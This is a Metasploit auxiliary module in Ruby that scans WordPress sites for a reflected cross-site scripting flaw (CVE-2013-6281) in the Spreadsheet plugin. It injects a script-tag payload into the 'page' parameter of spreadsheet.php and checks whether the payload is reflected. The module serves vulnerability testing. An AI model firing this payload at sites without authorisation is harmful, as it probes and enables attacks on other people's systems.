##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Spreadsheet Plugin XSS Scanner',
      'Description' => %q{
      This module attempts to exploit a Cross-Site Scripting in Spreadsheet for WordPress,
      version 2.0 and likely prior in order if the instance is vulnerable.
      },
      'Author'      =>
        [
          'ACC3SS', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2013-6281'],
          ['OSVDB', '98831'],
          ['WPVDB', '6980'],
          ['URL', 'http://packetstormsecurity.com/files/123699/']
        ],
      'DisclosureDate' => 'Oct 18 2013'
    ))
  end

  def check
    check_plugin_version_from_readme('dhtmlxspreadsheet', '2.1')
  end

  def run_host(ip)
    xss = Rex::Text.rand_text_alpha(8)

    res = send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_plugins, 'dhtmlxspreadsheet', 'codebase', 'spreadsheet.php'),
      'vars_get' => {
        'page' => "\"'><script>alert(\"#{xss}\")</script>"
      }
    )

    unless res && res.body
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end

    if res.code == 200 && res.body =~ /#{xss}/
      print_good("#{peer} - Vulnerable to Cross-Site Scripting the \"SPreadsheet Plugion 2.0\" plugin for WordPress")
      report_vuln(
        host: rhost,
        port: rport,
        proto: 'tcp',
        name: 'Cross-Site Scripting in Spreadsheet Plugin 2.0 for WordPress',
        refs: references
      )
    else
      print_error("#{peer} - Failed, maybe the target isn't vulnerable.")
    end
  end
end
